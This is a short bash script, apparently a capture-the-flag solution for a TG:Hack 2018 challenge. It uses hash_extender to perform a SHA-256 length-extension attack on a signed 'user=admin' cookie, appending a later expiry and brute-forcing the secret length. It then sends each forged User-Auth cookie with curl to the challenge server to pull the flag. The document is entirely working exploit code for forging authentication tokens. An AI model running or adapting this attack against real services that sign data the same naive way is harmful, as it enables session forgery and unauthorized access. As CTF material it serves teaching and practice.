#!/bin/bash
res=`./hash_extender \
    --data "user=admin&expiry=1521718539" \
    --secret-min 1 \
    --secret-max 20 \
    --append "&expiry=1700000000" \
    --signature 7d2250c3093c7ec2821739f45cd3f972048899dbf268d4608ccc090b71f6e735 \
    --format sha256`

hashes=`echo "$res" | grep "string" | cut -d " " -f 3`
signature=`echo "$res" | grep "signature" | cut -d " " -f 3 | head -n 1`

for h in $hashes
do
    cookie="User-Auth=$h-$signature; Max-Age=300"
    curl --silent --cookie $cookie "http://paddington.tghack.no" | grep TG18
done
